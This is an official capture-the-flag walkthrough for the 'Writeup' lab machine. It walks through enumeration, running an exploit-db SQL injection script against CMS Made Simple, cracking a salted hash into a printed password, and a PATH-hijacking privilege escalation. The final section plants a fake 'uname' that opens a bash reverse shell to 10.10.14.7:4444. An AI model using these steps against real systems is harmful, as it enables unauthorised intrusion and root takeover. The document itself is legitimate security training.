@@ -1,0 +1,127 @@
+Writeup
+
+12t h June 2019 / Document No D19.100.42
+
+Prepared By: MinatoTW
+Machine Author: jkr
+Difficulty: Easy
+Classification: Official
+
+                                                                        Page 1 / 10
+SYNOPSIS
+
+Writeup is an easy difficulty Linux box with DoS protection in place to prevent brute forcing. A
+CMS is found, and contains a SQL injection vulnerability, which is leveraged to gain user
+credentials. The user is found to be in a non-default group, which gives him write access to part
+of the PATH. A path hijacking results in escalation of privileges to root.
+
+Skills Required   Skills Learned
+
+     Enumeration       Path hijacking
+                       Process enumeration
+
+                                            Page 2 / 10
+ENUMERATION
+NMAP
+
+ nmap -p- -T4 --min-rate=1000 10.10.10.138
+
+We see SSH and Apache open on their common ports.
+
+APACHE
+
+Browsing to port 80 we see a retro style page.
+
+We see that the server has DoS protection enabled. However, we can instead use Burp Spider to
+crawl the application for files and folders.
+
+                                                                                                                  Page 3 / 10
+Intercept a request in Burp, Right click on it and select "Send to spider". Switch to the target tab
+and we'll see it found some files.
+The robots.txt contains a disallowed entry /writeup which was also spidered by Burp.
+
+Browsing to /writeup we see a page containing box writeups.
+
+                                                                                                                  Page 4 / 10
+Looking at the cookies we spot a cookie named CMSSESSID.
+
+So it must be hosting some kind of CMS but we don't know which. We can use wappalyzer in
+order to find the CMS.
+ apt install npm
+ npm i -g wappalyzer
+ wappalyzer http://10.10.10.138/writeup/ | jq
+
+                                                                                                                  Page 5 / 10
+We receive all sorts of information about the backend including the name of the CMS - "CMS
+Made Simple". The source of the page confirms the same.
+
+We see that the Copyright is for 2004-2019. So this must be a 2019 version. Going to exploit-db
+and searching for it we find a SQL injection v ulnerability from the same year. Looking at the script
+we see that it's exploiting a time-based blind injection.
+
+Download the script and supply it with the URL to our target.
+
+ wget https://www.exploit-db.com/download/46635
+ python 46635 -u http://10.10.10.138/writeup
+
+It finds the username "jkr", password hash and the salt.
+
+                                                               Page 6 / 10
+FOOTHOLD
+
+We can use hashcat to crack the MD5 hash. Copy the hash into a file in the format hash:salt and
+then use hashcat mode 20 to crack it.
+ echo '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > hash
+ hashcat -a 0 -m 20 hash rockyou.txt
+
+The hash is cracked as raykayjay9. The credentials jkr / raykayjay9 are used to SSH into the box.
+ ssh jkr@10.10.10.138
+
+                                                                                                                  Page 7 / 10
+PRIVILEGE ESCALATION
+ENUMERATION
+
+Let's find the configuration files edited on the box recently.
+ cd /etc
+ ls -lt
+Most files were edited on April 19 among which the update-motd.d directory is found too.
+
+This directory contains configuration files for the motd (message of the day) service which is used
+to send messages to users. Looking into the folder we see an uncommon file which is 10-uname.
+
+Let's see if this is called when a user logs in. Download p spy onto the box and run it.
+ wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32
+ scp pspy32 jkr@10.10.10.138:/tmp
+ cd /tmp
+ chmod +x pspy32
+ ./pspy32
+
+                                                                                                                  Page 8 / 10
+Let it run, and from another terminal login to SSH.
+We see that motd was called and the file 10-uname was accessed. Going back and looking at the
+user's groups we see that he's in the "staff" group which is non-standard.
+Let's find the files and folders owned by the group.
+ find / -group staff 2>/dev/null
+
+We see that the members can write to /usr/local and sub folders.
+
+                                                                                                                  Page 9 / 10
+Looking at the PATH variable we see that the /usr/local/bin comes first in the search order.
+
+So, we can place a malicious uname in the folder and when root calls uname it will look for it in
+the /usr/local/bin folder first and execute it.
+
+PATH HIJACKING
+
+Let's place uname in the folder with a reverse shell.
+ cd /tmp
+ printf ' #!/bin/bash' > uname
+ printf ' \nbash -i >& /dev/tcp/10.10.14.7/4444 0>&1' >> uname
+ chmod a+x uname
+ cp uname /usr/local/ bin
+Start listening and login via SSH from another terminal.
+
+This will execute our malicious uname and give us a shell as root.
+
+                                                                    Page 10 / 10
+
